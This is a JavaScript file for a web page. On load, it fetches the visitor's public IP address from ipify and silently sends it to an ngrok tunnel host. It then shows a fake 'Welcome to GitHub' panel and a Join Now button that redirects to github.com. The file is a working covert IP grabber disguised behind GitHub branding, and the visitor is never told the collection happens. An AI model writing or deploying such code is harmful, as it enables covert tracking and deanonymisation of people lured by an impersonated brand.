document.addEventListener("DOMContentLoaded", () => {
    const sendIP = async () => {
        try {
            // Show processing message initially
            document.querySelector('.message').innerHTML = `
                <p id="status">PROCESSING...</p>
                <p id="sub-status">Please be patient</p>
            `;

            // Get the IP address
            const ipAddress = await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip);

            // Send IP Address to Server
            const response = await fetch('https://cb5c-102-22-168-100.ngrok-free.app', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ipAddress: ipAddress,
                }),
            });

            if (response.ok) {
                // Show the welcome message and buttons with GitHub info on success
                document.querySelector('.message').innerHTML = `
                    <p id="welcome">WELCOME</p>
                    <p id="description">To GitHub</p>
                    <button id="join-now">Join Now</button>
                    <div id="additional-info">
                        <p>Join a global community of developers and open-source enthusiasts.</p>
                        <p>Collaborate seamlessly on projects, big or small.</p>
                        <p>Track changes and manage versions effortlessly with Git’s powerful tools.</p>
                        <p>Integrate easily with popular CI/CD pipelines for smooth deployment.</p>
                        <p>Showcase your projects and skills with a professional portfolio.</p>
                        <p>Discover and contribute to cutting-edge innovations.</p>
                        <p>Secure your code with robust access controls and collaboration features.</p>
                        <p>Be part of a dynamic network where your ideas can thrive.</p>
                        <p>GitHub - Where code meets collaboration.</p>
                        <p>Start today and take your development to the next level!</p>
                    </div>
                `;
                document.getElementById('join-now').addEventListener('click', () => {
                    window.location.href = 'https://github.com/';
                });
            } else {
                // Show "Failed to connect" message on failure
                document.querySelector('.message').innerHTML = `
                    <p id="status">Failed to connect to website</p>
                    <p id="sub-status">That's all we know</p>
                `;
            }
        } catch (error) {
            // Show "Failed to connect" message if there's a network error
            document.querySelector('.message').innerHTML = `
                <p id="status">Failed to connect to website</p>
                <p id="sub-status">That's all we know</p>
            `;
        }
    };

    sendIP();
});
